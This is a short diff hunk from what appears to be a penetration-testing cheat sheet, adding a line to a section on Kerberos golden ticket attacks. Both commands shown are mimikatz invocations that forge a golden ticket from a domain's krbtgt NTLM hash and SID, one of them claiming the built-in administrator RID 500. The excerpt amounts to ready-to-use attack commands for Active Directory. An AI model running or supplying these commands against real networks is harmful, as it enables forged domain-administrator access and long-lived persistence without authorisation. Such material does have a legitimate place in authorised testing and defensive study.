@@ -786,6 +786,8 @@ https://attack.stealthbits.com/how-golden-ticket-attack-works
 
 ```
 mimikatz# kerberos::golden /admin:<USERNAME> /domain:<DOMAIN> /id:<FAKE_RID> /sid:<SID> /krbtgt:<NTLM_HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+.\mimikatz_64.exe "kerberos::golden /domain:domain.local /sid:<SID> /rc4:<NTLM> /id:500 /user:TrustMe" exit
 ```
 
 NTLM Password Generator if you do not have a NTLM hash  
